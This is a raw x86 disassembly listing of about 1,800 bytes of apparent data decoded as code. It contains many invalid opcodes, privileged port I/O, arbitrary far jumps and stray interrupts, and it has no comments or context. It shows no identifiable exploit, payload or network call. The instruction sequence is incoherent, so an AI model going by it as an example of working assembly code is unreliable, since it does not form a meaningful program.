  409320:	scas   eax,DWORD PTR es:[edi]
  409321:	sbb    DWORD PTR [esi],eax
  409323:	jmp    0x525d:0xb0b46f4b
  40932a:	add    ebx,DWORD PTR [edx-0x35eee9f8]
  409330:	sub    edx,DWORD PTR [edx+esi*4+0x23]
  409334:	xor    BYTE PTR [edi-0x2f47317c],bl
  40933a:	xor    dl,BYTE PTR [edi+eax*8+0x14]
  40933e:	mov    bh,0xc8
  409340:	sub    DWORD PTR [ebx],esp
  409342:	std    
  409343:	xchg   edx,eax
  409344:	adc    eax,0xb09a7916
  409349:	aam    0x73
  40934b:	jb     0x409325
  40934d:	mov    esp,DWORD PTR [ebp-0x4a]
  409350:	mov    al,cl
  409352:	pop    ebp
  409353:	mul    ch
  409355:	(bad)  
  409356:	repnz not DWORD PTR [esi+0x49]
  40935a:	ficom  WORD PTR [ebp+0x2c2d0160]
  409360:	mov    BYTE PTR [ecx-0x6f],ch
  409363:	dec    esp
  409364:	or     ebp,DWORD PTR [edx]
  409366:	adc    BYTE PTR [edi+edi*2+0x235539f3],ah
  40936d:	fst    DWORD PTR [ebx+0x1fcf9bb5]
  409373:	bound  ecx,QWORD PTR gs:[ecx]
  409376:	ret    
  409377:	aad    0x98
  409379:	imul   eax,DWORD PTR [edi],0xf4a25c89
  40937f:	lea    ebp,[edx]
  409381:	push   es
  409382:	test   eax,0x8b06ccce
  409387:	test   eax,0xca86ed78
  40938c:	fnsetpm(287 only) 
  40938e:	sub    ah,BYTE PTR [esi+0x2a]
  409391:	imul   ecx,DWORD PTR [esi+eiz*2-0x5c],0xd4a3b725
  409399:	and    dl,BYTE PTR [ecx+0x60]
  40939c:	mov    WORD PTR [eax+0x37],ss
  40939f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093a0:	sub    al,0x5f
  4093a2:	pop    es
  4093a3:	mov    al,ds:0x78b0621c
  4093a8:	jo     0x409406
  4093aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093ab:	les    edx,FWORD PTR ds:0xbec553c8
  4093b1:	pop    ax
  4093b3:	or     cl,BYTE PTR [edi-0x64]
  4093b6:	ror    eax,cl
  4093b8:	je     0x4093fa
  4093ba:	push   ss
  4093bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093bc:	mov    ?,WORD PTR [ecx-0x2e]
  4093bf:	test   BYTE PTR [ebx-0x407dd864],ah
  4093c5:	mov    al,ds:0x2b1d48f6
  4093ca:	shl    BYTE PTR [ebx-0x4b],0xb1
  4093ce:	lds    esi,FWORD PTR [ebx-0x46]
  4093d1:	add    al,0xc1
  4093d3:	and    ecx,DWORD PTR [ecx]
  4093d5:	and    eax,esi
  4093d7:	jbe    0x409450
  4093d9:	xchg   ebp,eax
  4093da:	pusha  
  4093db:	pop    edi
  4093dc:	or     eax,0xd86c7d09
  4093e1:	and    al,0x56
  4093e3:	xchg   DWORD PTR [ebp+0x26],esp
  4093e6:	mov    ebp,0x3aed174
  4093eb:	jg     0x4093cd
  4093ed:	inc    edi
  4093ee:	pop    esi
  4093ef:	ss push 0x64
  4093f2:	mov    cl,0x6c
  4093f4:	jp     0x409437
  4093f6:	and    esi,DWORD PTR [ecx-0x6e091b47]
  4093fc:	xchg   ebp,eax
  4093fd:	imul   DWORD PTR [edi+0x67]
  409400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409401:	fidivr WORD PTR [esi-0x2f]
  409404:	dec    ebp
  409405:	ret    0xcb80
  409408:	test   eax,0xd79aa5c3
  40940d:	push   ds
  40940e:	mov    bl,BYTE PTR [ecx]
  409410:	jp     0x40944c
  409412:	sbb    al,0xd7
  409414:	popf   
  409415:	popa   
  409416:	push   0x74
  409418:	mov    cl,0xfe
  40941a:	or     eax,0x835313b5
  40941f:	cmp    eax,0x18aefda7
  409424:	or     dl,BYTE PTR [edx-0x3b]
  409427:	test   eax,0x891befa9
  40942c:	repnz aas 
  40942e:	mov    ecx,0x23ccefd7
  409433:	test   al,0x6b
  409435:	add    dl,cl
  409437:	bound  ebp,QWORD PTR [esi-0x516af3b3]
  40943d:	and    eax,0xa7961831
  409442:	int    0x92
  409444:	adc    eax,0x968fb316
  409449:	xchg   BYTE PTR [ebx],ch
  40944b:	dec    edx
  40944c:	(bad)  [ebp-0x32]
  40944f:	aam    0x40
  409451:	or     DWORD PTR [esi-0x79],ecx
  409454:	ins    DWORD PTR es:[edi],dx
  409455:	xor    BYTE PTR [edi+eiz*8],bl
  409458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409459:	jmp    0xe818:0x2aba5fff
  409460:	je     0x4093f8
  409462:	push   esi
  409463:	int    0x2a
  409465:	mov    ecx,DWORD PTR [ecx]
  409467:	outs   dx,DWORD PTR ds:[esi]
  409468:	mov    eax,0xcfd73efb
  40946d:	add    al,0xf0
  40946f:	neg    DWORD PTR [esi+0x1b8e6630]
  409475:	add    dl,BYTE PTR [eax]
  409477:	mov    ebx,0x59e26612
  40947c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40947d:	(bad)  
  40947f:	ret    0x4b0f
  409482:	inc    edi
  409483:	imul   eax,DWORD PTR [edi+0x490e7ef],0xffffffbe
  40948a:	stos   DWORD PTR es:[edi],eax
  40948b:	dec    edi
  40948c:	add    eax,0xe8b7a8e8
  409491:	retf   
  409492:	in     al,dx
  409493:	in     eax,dx
  409494:	pop    esi
  409495:	aad    0xf2
  409497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409498:	mov    dh,0xe1
  40949a:	mov    ecx,0x49e3b56a
  40949f:	test   DWORD PTR [esi+0x7a87ed61],ebp
  4094a5:	pop    ecx
  4094a6:	dec    eax
  4094a7:	test   BYTE PTR [edi-0x38a995f6],al
  4094ad:	mov    ds:0x606a5036,al
  4094b2:	pop    ebx
  4094b3:	xchg   DWORD PTR [eax],ecx
  4094b5:	sbb    eax,0xf4b35a6d
  4094ba:	in     eax,0xc8
  4094bc:	jbe    0x4094d3
  4094be:	lods   al,BYTE PTR ds:[esi]
  4094bf:	test   al,0xf0
  4094c1:	mov    cl,0x93
  4094c3:	pop    esi
  4094c4:	cmp    DWORD PTR [ebp+0x65721500],0x2a
  4094cb:	in     al,0xdf
  4094cd:	dec    ebx
  4094ce:	repnz pushf 
  4094d0:	mov    ds:0xd05b8ae1,eax
  4094d5:	sbb    DWORD PTR [ebx+0xf],edx
  4094d8:	ins    BYTE PTR es:[edi],dx
  4094d9:	add    esi,DWORD PTR [eax]
  4094db:	inc    edi
  4094dc:	jb     0x4094b2
  4094de:	pop    esp
  4094df:	cs fs jge 0x4094c7
  4094e3:	sar    BYTE PTR [eax-0x5f7b01b5],1
  4094e9:	jge    0x409523
  4094eb:	push   0xe88e8d23
  4094f0:	nop
  4094f1:	and    eax,0x6fa3becf
  4094f6:	dec    eax
  4094f7:	sub    eax,0x61daf44
  4094fc:	adc    al,BYTE PTR [ecx+ebx*2+0x6e]
  409500:	ins    BYTE PTR es:[edi],dx
  409501:	shr    eax,0x86
  409504:	push   ebp
  409505:	cld    
  409506:	dec    eax
  409507:	sbb    eax,DWORD PTR [esi]
  409509:	loope  0x409537
  40950b:	adc    cl,BYTE PTR fs:[edi-0x6b]
  40950f:	dec    eax
  409510:	pop    eax
  409511:	shr    DWORD PTR es:[esi],1
  409514:	je     0x40949c
  409516:	push   ebp
  409517:	mov    bl,0x24
  409519:	jns    0x409585
  40951b:	ins    DWORD PTR es:[edi],dx
  40951c:	fsubp  st(0),st
  40951e:	jno    0x4094ef
  409520:	sub    al,0x7a
  409522:	(bad)  
  409523:	fstp   QWORD PTR [ebx]
  409525:	clc    
  409526:	jnp    0x4094d8
  409528:	pop    ebx
  409529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40952a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40952b:	mov    es,WORD PTR [esi-0x3a]
  40952e:	xchg   esp,eax
  40952f:	test   DWORD PTR [edx],edi
  409531:	cdq    
  409532:	pop    edi
  409533:	push   eax
  409534:	mov    eax,0x4a6e28d3
  409539:	pop    edx
  40953a:	adc    DWORD PTR [eax+0x73],esp
  40953d:	xor    bl,bh
  40953f:	or     bl,BYTE PTR [edi-0x733050d4]
  409545:	cmc    
  409546:	cmp    al,0x79
  409548:	rcr    BYTE PTR [edi+ebp*8],cl
  40954b:	add    eax,0x34cf8da2
  409550:	mov    ecx,0x91cf423d
  409555:	sbb    BYTE PTR [edx-0x371fdf56],dl
  40955b:	(bad)  
  40955c:	xchg   esp,eax
  40955d:	je     0x4094e3
  40955f:	in     eax,0x27
  409561:	pop    esp
  409562:	xchg   esi,eax
  409563:	mov    ds:0x975998f1,al
  409568:	xchg   ebp,eax
  409569:	mov    ?,WORD PTR [esp+eiz*2]
  40956c:	push   0x23
  40956e:	shl    bl,1
  409570:	mov    ebp,0xa27e4987
  409575:	jno    0x409597
  409577:	mov    eax,ds:0x99f0c933
  40957c:	retf   0x4159
  40957f:	shl    BYTE PTR [eax+0x7a],1
  409582:	xor    BYTE PTR [esi-0xf7e60f9],dh
  409588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409589:	rol    DWORD PTR [esi],1
  40958b:	mov    ah,BYTE PTR [eax-0x34]
  40958e:	mov    ebp,0xb3cc09a
  409593:	outs   dx,BYTE PTR ds:[esi]
  409594:	add    eax,DWORD PTR [edx-0x5f]
  409597:	das    
  409598:	test   DWORD PTR ds:0xfb41816b,0x598c3470
  4095a2:	cmp    cl,BYTE PTR [edx-0x78]
  4095a5:	mov    esp,DWORD PTR [edi]
  4095a7:	rol    edx,0xaf
  4095aa:	pop    ss
  4095ab:	hlt    
  4095ac:	sub    esi,DWORD PTR [edx]
  4095ae:	jp     0x409595
  4095b0:	sahf   
  4095b1:	scas   al,BYTE PTR es:[edi]
  4095b2:	sbb    eax,0xe35a5945
  4095b7:	mov    dl,0x2d
  4095b9:	mov    ah,BYTE PTR [eax+0x6b]
  4095bc:	mov    eax,ds:0x99583cec
  4095c1:	pusha  
  4095c2:	popf   
  4095c3:	lods   al,BYTE PTR ds:[esi]
  4095c4:	dec    ecx
  4095c5:	or     DWORD PTR [edi+0x4b],edi
  4095c8:	inc    edi
  4095c9:	fidivr DWORD PTR [eax+ecx*1+0x3d]
  4095cd:	es mov ch,0x83
  4095d0:	dec    edx
  4095d1:	lods   al,BYTE PTR ds:[esi]
  4095d2:	cmp    esp,DWORD PTR [eax+0x661cec6e]
  4095d8:	data16 cs (bad) 
  4095db:	in     eax,dx
  4095dc:	ss in  al,0xa5
  4095df:	jo     0x409646
  4095e1:	(bad)  
  4095e2:	dec    ebx
  4095e3:	cwde   
  4095e4:	mov    eax,0xfbac576
  4095e9:	push   DWORD PTR [ebx+0x75]
  4095ec:	arpl   WORD PTR [esi-0x2745f952],si
  4095f2:	sbb    al,0x2c
  4095f4:	or     eax,DWORD PTR [ecx+0x3f1ecf77]
  4095fa:	fisub  DWORD PTR cs:[edx-0x354588be]
  409601:	inc    esp
  409602:	(bad)  
  409603:	or     esp,DWORD PTR [ecx]
  409605:	xor    BYTE PTR [esi+0x6a99f49b],al
  40960b:	sahf   
  40960c:	mov    DWORD PTR [eax+ebp*1],0x1d5de44d
  409613:	sbb    BYTE PTR [esi-0x22],0x5f
  409617:	(bad)  
  409618:	push   ss
  409619:	cmp    eax,0x83cad1aa
  40961e:	pop    edx
  40961f:	ret    
  409620:	lds    esi,FWORD PTR [ebx]
  409622:	sbb    BYTE PTR es:[ecx],ah
  409625:	popf   
  409626:	jne    0x40966c
  409628:	xor    esi,DWORD PTR [edx+0x6f]
  40962b:	push   0xaf80ea7f
  409630:	push   eax
  409631:	fidivr WORD PTR ss:[esi+0x7a157d38]
  409638:	cs into 
  40963a:	pop    esi
  40963b:	imul   BYTE PTR [edx]
  40963d:	mov    fs,WORD PTR [ebx-0x72e5f45d]
  409643:	mov    esp,0x4c711a80
  409648:	cmp    DWORD PTR [ebp+0x14dac801],edx
  40964e:	dec    esi
  40964f:	xchg   ebx,eax
  409650:	adc    BYTE PTR [ecx+0x45d52c04],dh
  409656:	sahf   
  409657:	xor    ebx,DWORD PTR [esi]
  409659:	jb     0x4096b9
  40965b:	mov    cl,BYTE PTR [esp+eax*1-0x23]
  40965f:	ins    DWORD PTR es:[edi],dx
  409660:	sbb    ecx,esi
  409662:	mov    ebp,0x4593fc5a
  409667:	js     0x4096dc
  409669:	xor    al,0xc8
  40966b:	mov    bl,0x40
  40966d:	dec    eax
  40966e:	cmovnp ecx,DWORD PTR [ecx-0x5f7aa18a]
  409675:	xchg   ebx,eax
  409676:	or     ecx,eax
  409678:	and    ah,BYTE PTR [edi]
  40967a:	mov    al,0xf0
  40967c:	push   ecx
  40967d:	lock pop esp
  40967f:	sub    BYTE PTR [eax+0x104fdb1e],al
  409685:	jmp    0x409670
  409687:	xor    eax,0x25299c8a
  40968c:	(bad)  
  40968d:	int3   
  40968e:	mov    dl,0x3e
  409690:	xchg   ecx,eax
  409691:	fimul  DWORD PTR [ebp-0x538c2685]
  409697:	add    eax,DWORD PTR [ebp-0x37]
  40969a:	jge    0x4096d9
  40969c:	push   esp
  40969d:	ja     0x4096b6
  40969f:	lods   eax,DWORD PTR ds:[esi]
  4096a0:	sbb    al,BYTE PTR [edx+0x6b725cf4]
  4096a6:	inc    esp
  4096a7:	js     0x409683
  4096a9:	test   al,0xc
  4096ab:	pop    edi
  4096ac:	xor    BYTE PTR [eax],al
  4096ae:	mov    ebp,0xa57791f6
  4096b3:	xor    ebx,DWORD PTR [edx+0x389a111]
  4096b9:	loop   0x409715
  4096bb:	jmp    0xe984:0x5ebe0849
  4096c2:	pop    ss
  4096c3:	cmc    
  4096c4:	mov    dl,0x8d
  4096c6:	scas   eax,DWORD PTR es:[edi]
  4096c7:	stos   DWORD PTR es:[edi],eax
  4096c8:	int3   
  4096c9:	out    0x3,al
  4096cb:	pop    ecx
  4096cc:	xor    BYTE PTR [ebx],dh
  4096ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096d0:	ret    0x39c8
  4096d3:	(bad)  
  4096d4:	jl     0x4096ba
  4096d6:	push   0xf6094a47
  4096db:	jnp    0x409733
  4096dd:	mov    edi,0xe0bc33e5
  4096e2:	test   DWORD PTR [ebx*2+0x49c7a9c6],ebx
  4096e9:	mov    ds:0x783f12b2,eax
  4096ee:	jecxz  0x4096af
  4096f0:	xchg   BYTE PTR [ebx-0x6b],bh
  4096f3:	lods   al,BYTE PTR ds:[esi]
  4096f4:	xchg   edi,eax
  4096f5:	in     eax,0x10
  4096f7:	adc    eax,0x4d4a4433
  4096fc:	(bad)  
  4096fd:	xchg   edx,eax
  4096fe:	pop    ecx
  4096ff:	sbb    al,0x9b
  409701:	stos   BYTE PTR es:[edi],al
  409702:	sub    esp,DWORD PTR ds:0xe203641f
  409708:	ret    
  409709:	rol    BYTE PTR [eax+ebp*8],0xc7
  40970d:	int    0x87
  40970f:	imul   edi,esp,0x4acb9d7
  409715:	mov    DWORD PTR [eax-0x69306bf7],ecx
  40971b:	dec    ebp
  40971c:	ja     0x409728
  40971e:	ror    cl,1
  409720:	push   ss
  409721:	loope  0x409725
  409723:	iret   
  409724:	in     eax,dx
  409725:	and    al,0x7b
  409727:	xor    ebp,DWORD PTR [esi]
  409729:	jns    0x409792
  40972b:	dec    ebp
  40972c:	xchg   BYTE PTR [edx-0x73a99f08],dh
  409732:	jmp    0x40976a
  409734:	rcr    BYTE PTR [esi],0x7c
  409737:	lea    ecx,[edx-0x59]
  40973a:	fsub   QWORD PTR [ecx+ebp*8-0x628c206c]
  409741:	adc    eax,0x282285c8
  409746:	inc    esp
  409747:	push   esp
  409748:	fidivr DWORD PTR [edx+0x2a2fa9ae]
  40974e:	stos   DWORD PTR es:[edi],eax
  40974f:	pusha  
  409750:	je     0x40977a
  409752:	in     al,0x13
  409754:	sub    BYTE PTR [eax],0x36
  409757:	les    ebx,FWORD PTR es:0xfadca51
  40975e:	cs daa 
  409760:	popf   
  409761:	sbb    DWORD PTR [esi],0xfffffffb
  409764:	mov    ebp,0x41df5664
  409769:	inc    edx
  40976a:	adc    edi,DWORD PTR [esp+edx*8]
  40976d:	push   ebx
  40976e:	push   ebx
  40976f:	leave  
  409770:	push   edi
  409771:	push   edi
  409772:	pushf  
  409773:	adc    DWORD PTR [edx+ebp*1-0x3972569d],eax
  40977a:	xchg   esp,eax
  40977b:	jae    0x409795
  40977d:	je     0x4097d9
  40977f:	xchg   edx,eax
  409780:	push   0x25
  409782:	outs   dx,DWORD PTR ds:[esi]
  409783:	jmp    0x648aa26f
  409788:	cmp    eax,0xc2929ef3
  40978d:	xchg   BYTE PTR [ecx-0x20],bl
  409790:	enter  0x279,0x7e
  409794:	sbb    al,BYTE PTR [ebx]
  409796:	push   ecx
  409797:	(bad)  
  409798:	xor    ebx,DWORD PTR [esi*2-0x6048f2ab]
  40979f:	cmp    eax,0xa789222
  4097a4:	or     eax,0x62f3decb
  4097a9:	push   edi
  4097aa:	sub    BYTE PTR [eax-0x2520fe3e],bl
  4097b0:	in     eax,dx
  4097b1:	inc    ecx
  4097b2:	mov    dh,0x91
  4097b4:	lods   eax,DWORD PTR ds:[esi]
  4097b5:	inc    ebp
  4097b6:	fcomip st,st(3)
  4097b8:	sbb    al,0x6f
  4097ba:	call   0xdf8c36e7
  4097bf:	add    edx,DWORD PTR [edx+0x626f236d]
  4097c5:	jl     0x409801
  4097c7:	cdq    
  4097c8:	aas    
  4097c9:	add    eax,DWORD PTR [ecx-0x1919100b]
  4097cf:	out    dx,al
  4097d0:	inc    BYTE PTR [edx+0x1c]
  4097d3:	sub    eax,0xd08ce13b
  4097d8:	ret    
  4097d9:	(bad)  
  4097da:	and    BYTE PTR [edi+0x2f7fabfc],dl
  4097e0:	inc    ah
  4097e2:	xchg   ebp,eax
  4097e3:	add    BYTE PTR [edi+eax*4-0x13059edf],0x62
  4097eb:	mov    bh,0x56
  4097ed:	jne    0x40983e
  4097ef:	frstor [edi-0xc]
  4097f2:	inc    ecx
  4097f3:	fadd   st(1),st
  4097f5:	cs mov bl,0x7
  4097f8:	lds    esi,FWORD PTR [esp+edx*4]
  4097fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097fc:	aas    
  4097fd:	pop    ebp
  4097fe:	inc    ebp
  4097ff:	mov    ah,0x55
  409801:	cmp    BYTE PTR [ebx-0x6c],cl
  409804:	in     eax,dx
  409805:	dec    esp
  409806:	xchg   ah,bh
  409808:	and    dl,bl
  40980a:	lds    edi,FWORD PTR [esi+0x7f21aef]
  409810:	xchg   dl,bl
  409812:	xchg   ecx,eax
  409813:	push   0xffffffa6
  409815:	es pop edx
  409817:	and    eax,DWORD PTR [edx+0x53]
  40981a:	jne    0x40985e
  40981c:	jl     0x409811
  40981e:	lds    esp,FWORD PTR [edi-0x5e]
  409821:	aaa    
  409822:	test   al,0xe
  409824:	push   ss
  409825:	test   edx,ebp
  409827:	cli    
  409828:	mov    fs,ebp
  40982a:	pop    ds
  40982b:	repnz out 0x69,al
  40982e:	add    eax,0x3a53f1cc
  409833:	mov    edx,DWORD PTR [ecx+ebp*2-0x46]
  409837:	or     esp,DWORD PTR [edx-0x20]
  40983a:	int    0xc5
  40983c:	jnp    0x409858
  40983e:	retf   
  40983f:	push   cs
  409840:	jbe    0x40987f
  409842:	xor    dh,BYTE PTR [edi+0x65]
  409845:	mov    al,dl
  409847:	clc    
  409848:	and    DWORD PTR [esi+0x2a421ae2],ecx
  40984e:	jg     0x40989a
  409850:	or     DWORD PTR [esi],edi
  409852:	dec    eax
  409853:	mov    al,ds:0xe22c863e
  409858:	fsubr  DWORD PTR [edx-0x59e3779f]
  40985e:	int    0xa6
  409860:	das    
  409861:	ja     0x409898
  409863:	pop    ecx
  409864:	sbb    ch,BYTE PTR [eax]
  409866:	(bad)  
  409867:	inc    DWORD PTR [eax-0x46]
  40986a:	addr16 jne 0x409873
  40986d:	or     BYTE PTR [ecx],dh
  40986f:	pop    ebp
  409870:	sub    al,0xe2
  409872:	mov    ds:0x47b228e4,eax
  409877:	adc    bl,BYTE PTR ds:0x54296c83
  40987d:	xchg   ebx,edi
  40987f:	push   esi
  409880:	push   ds
  409881:	and    eax,0xc2b6ef7b
  409886:	pop    esp
  409887:	and    al,0x11
  409889:	stos   BYTE PTR es:[edi],al
  40988a:	inc    ecx
  40988b:	sub    edx,DWORD PTR [edi+0x37]
  40988e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40988f:	pop    edi
  409890:	or     bh,BYTE PTR [ecx]
  409892:	push   edx
  409893:	mov    cl,0x0
  409895:	mov    esp,0x714bd43e
  40989a:	(bad)  
  40989b:	aas    
  40989c:	adc    esi,DWORD PTR [edx-0x3]
  40989f:	or     cl,BYTE PTR [ebx]
  4098a1:	loopne 0x4098d0
  4098a3:	mov    esi,0xedf5b412
  4098a8:	mov    DWORD PTR [ecx+ebp*1+0x28],esp
  4098ac:	dec    esp
  4098ad:	cmp    bl,bh
  4098af:	sub    BYTE PTR [ebx-0x4cdda62a],bl
  4098b5:	dec    esi
  4098b6:	xchg   ebx,eax
  4098b7:	shr    DWORD PTR [ebx-0x70eafbbe],cl
  4098bd:	(bad)  
  4098be:	jl     0x4098f8
  4098c0:	push   ebx
  4098c1:	cmp    edx,DWORD PTR ds:0xe0648d32
  4098c7:	out    dx,al
  4098c8:	adc    dl,dh
  4098ca:	leave  
  4098cb:	jge    0x4098ba
  4098cd:	lahf   
  4098ce:	test   edx,esi
  4098d0:	cmp    ch,BYTE PTR [eax]
  4098d2:	push   es
  4098d3:	ret    
  4098d4:	out    dx,eax
  4098d5:	sub    eax,0xef40f4b4
  4098da:	xchg   ebx,eax
  4098db:	mov    ah,0xe8
  4098dd:	and    eax,0x8e6751d3
  4098e2:	das    
  4098e3:	jl     0x409878
  4098e5:	or     eax,0x393fc26e
  4098ea:	retf   0xd0d8
  4098ed:	clc    
  4098ee:	outs   dx,BYTE PTR ds:[esi]
  4098ef:	das    
  4098f0:	mov    BYTE PTR [ecx+0x7d447114],dh
  4098f6:	test   WORD PTR [eax+0x71],si
  4098fa:	arpl   WORD PTR [ecx+0x5b6f336e],si
  409900:	into   
  409901:	mov    eax,ds:0x665519e0
  409906:	mov    dl,0x7e
  409908:	xor    DWORD PTR [edx+0x4148ac1f],esp
  40990e:	pop    ebx
  40990f:	scas   al,BYTE PTR es:[edi]
  409910:	or     eax,0xc12d48ec
  409915:	gs mov dl,0xaa
  409918:	in     al,dx
  409919:	fwait
  40991a:	xchg   esi,eax
  40991b:	mov    ds,edi
  40991d:	mov    esp,0x1d3573aa
  409922:	add    bl,BYTE PTR [eax-0x4848e4ef]
  409928:	jmp    0x4098d4
  40992a:	add    DWORD PTR [ebp-0x14684422],ecx
  409930:	or     eax,DWORD PTR [ebx+0x18]
  409933:	cmp    ecx,DWORD PTR [ebx+0x3f]
  409936:	jb     0x40996b
  409938:	stos   BYTE PTR es:[edi],al
  409939:	outs   dx,DWORD PTR ds:[esi]
  40993a:	cmp    BYTE PTR [eax-0x66293142],0x5d
  409941:	iret   
  409942:	and    al,0xdd
  409944:	(bad)  
  409945:	push   ebp
  409946:	sub    dh,BYTE PTR [esi+0xcb1efa6]
  40994c:	aam    0x45
  40994e:	inc    edx
  40994f:	xor    eax,0x2d30393a
  409954:	or     eax,eax
  409956:	rcr    ch,0xc4
  409959:	repnz pop ecx
  40995c:	(bad)  
  40995d:	dec    ebx
  40995e:	push   cs
  40995f:	lahf   
  409960:	cmc    
  409961:	es xor dl,bh
  409964:	in     eax,dx
  409965:	clc    
  409966:	xchg   ecx,eax
  409967:	lods   eax,DWORD PTR ds:[esi]
  409968:	cs stos BYTE PTR es:[edi],al
  40996a:	popf   
  40996b:	jns    0x4099b7
  40996d:	bound  edx,QWORD PTR [esp+eax*2-0x6d]
  409971:	fs retf 
  409973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409974:	pop    edx
  409975:	fsub   QWORD PTR [ebx-0x3ae29dc5]
  40997b:	jo     0x409962
  40997d:	(bad)  
  40997e:	cmp    al,0x3c
  409980:	int3   
  409981:	jae    0x4099f6
  409983:	enter  0x6da7,0xcb
  409987:	and    BYTE PTR [eax],al
  409989:	aam    0xc4
  40998b:	js     0x409980
  40998d:	jnp    0x4099e3
  40998f:	pop    es
  409990:	lock std 
  409992:	push   edi
  409993:	retf   0x1d71
  409996:	xchg   ebx,eax
  409997:	mov    ebp,0x86f15640
  40999c:	rol    DWORD PTR [edi+ecx*4+0x3d],0xcc
  4099a1:	lock adc eax,0x21ca9993
  4099a7:	mov    edx,0x7eab9da5
  4099ac:	adc    al,BYTE PTR [esp+edx*8-0x6e12f815]
  4099b3:	xchg   edx,eax
  4099b4:	push   ecx
  4099b5:	pushf  
  4099b6:	lock sub dh,BYTE PTR [ebp+ecx*4+0x18]
  4099bb:	js     0x409978
  4099bd:	adc    cl,BYTE PTR [ecx+0x38259a83]
  4099c3:	add    DWORD PTR [eax-0x20],edx
  4099c6:	mov    ebp,0xdc7d2db0
  4099cb:	pushf  
  4099cc:	loop   0x409a42
  4099ce:	nop
  4099cf:	mov    edx,0xca6a0a73
  4099d5:	in     eax,dx
  4099d6:	adc    DWORD PTR [ebp-0x2c],0x87b40ff4
  4099dd:	cld    
  4099de:	cmp    al,0x5a
  4099e0:	cs cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4099e3:	dec    esp
  4099e4:	mov    DWORD PTR [di+0x5742],ecx
  4099e9:	pop    ebx
  4099ea:	xor    dl,dl
  4099ec:	push   0x49
  4099ee:	and    eax,0xde1b2275
  4099f3:	out    0x4e,al
  4099f5:	sahf   
  4099f6:	jmp    0xfd9ac0ea
  4099fb:	je     0x409a55
  4099fd:	ss leave 
  4099ff:	xchg   edx,eax
  409a00:	or     cl,ah
  409a02:	in     al,dx
  409a03:	inc    esi
  409a04:	adc    eax,0x7a2fd586
  409a09:	out    0x82,eax
  409a0b:	xchg   eax,ecx
  409a0d:	xchg   ebp,eax
  409a0e:	lods   al,BYTE PTR ds:[esi]
  409a0f:	je     0x4099c6
  409a11:	pop    edx
  409a12:	dec    edi
  409a13:	mov    esi,0x75fa0670
  409a18:	and    ch,dh
  409a1a:	jns    0x409a13
  409a1c:	lods   eax,DWORD PTR ds:[esi]
  409a1d:	fsub   DWORD PTR [ebx]
  409a1f:	push   edi
  409a20:	dec    ebp
  409a21:	and    dl,BYTE PTR [ecx+ecx*8-0x56d31a0a]
  409a28:	and    BYTE PTR [eax-0x34],0xae
  409a2c:	cli    
  409a2d:	push   ds
  409a2e:	rcr    BYTE PTR [edi],cl
  409a30:	lods   eax,DWORD PTR ds:[esi]
  409a31:	fstp   QWORD PTR [ecx+edi*4]
  409a34:	jle    0x409a2d
  409a36:	mov    ebp,0xe871108c
  409a3b:	push   edx
  409a3c:	test   al,0x17
  409a3e:	shl    DWORD PTR [esi],1
  409a40:	dec    esp
  409a41:	or     eax,0x86d02130
  409a46:	jno    0x409a21
  409a48:	adc    BYTE PTR [esi],dl
  409a4a:	cmp    dh,BYTE PTR [edx-0x56]
  409a4d:	push   ebx
  409a4e:	add    bh,bh
  409a50:	int    0x1c
  409a52:	lods   al,BYTE PTR ds:[esi]
  409a53:	inc    esi
  409a54:	dec    ebp
  409a55:	jns    0x409a79
  409a57:	sub    eax,0x7c659f87
  409a5c:	sbb    ecx,DWORD PTR [ecx+0x45]
  409a5f:	ret    
  409a60:	mov    BYTE PTR [ebx*4+0x11540aa8],ah
  409a67:	xchg   ebp,eax
  409a68:	gs (bad) 
  409a6a:	retf   0x9344
  409a6d:	xor    al,0x98
  409a6f:	out    dx,eax
  409a70:	aas    
  409a71:	fwait
  409a72:	cld    
  409a73:	add    bl,al
  409a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a76:	dec    eax
  409a77:	aad    0xa9
  409a79:	cli    
  409a7a:	cmp    eax,0x7a42e6c0
  409a7f:	mov    ds:0x1aeb7cd6,eax
  409a84:	jns    0x409a37
  409a86:	aas    
  409a87:	push   es
  409a88:	jl     0x409a77
  409a8a:	push   ss
  409a8b:	inc    esi
  409a8c:	out    dx,al
  409a8d:	jns    0x409a3f
  409a8f:	and    dl,BYTE PTR [edi]
  409a91:	or     DWORD PTR ds:0x5636512b,edx
  409a97:	xor    BYTE PTR [edx*8+0x164d6b68],bl
  409a9e:	adc    eax,0xdf353ece
  409aa3:	in     eax,0x22
  409aa5:	adc    edi,DWORD PTR [edx]
  409aa7:	retf   
  409aa8:	(bad)  
  409aa9:	jg     0x409b26
  409aab:	stos   BYTE PTR es:[edi],al
  409aac:	dec    ebp
  409aad:	xchg   esp,eax
  409aae:	push   cs
  409aaf:	mov    al,ds:0x531c0332
  409ab4:	cmp    al,0xa7
  409ab6:	test   al,0x29
  409ab8:	xor    al,0xcd
  409aba:	push   es
  409abb:	mov    eax,0xe5193bc7
  409ac0:	shl    DWORD PTR [ebx+0x4712f444],cl
  409ac6:	int    0x7
  409ac8:	pop    ds
  409ac9:	xchg   ebp,edx
  409acb:	xor    al,BYTE PTR [eax+0x106a7bdb]
  409ad1:	into   
  409ad2:	out    0x60,eax
  409ad4:	les    eax,FWORD PTR [ebx-0x5c2cb8dc]
  409ada:	fmul   QWORD PTR [edi]
  409adc:	test   eax,0x7b978861
  409ae1:	out    dx,al
  409ae2:	fmul   QWORD PTR [ebp-0x3a892686]
  409ae8:	xchg   esi,eax
  409ae9:	xor    ebx,ecx
  409aeb:	pop    esp
  409aec:	sti    
  409aed:	(bad)  
  409aee:	icebp  
